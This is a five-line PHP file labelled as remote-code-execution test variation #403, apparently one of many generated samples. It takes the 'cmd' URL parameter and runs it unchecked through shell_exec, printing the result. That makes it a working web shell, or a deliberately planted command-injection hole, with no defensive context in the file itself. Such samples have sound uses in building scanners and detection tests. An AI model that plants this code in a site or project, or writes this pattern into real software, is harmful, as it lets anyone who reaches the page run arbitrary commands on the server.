<?php
// RCE test variation #403
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>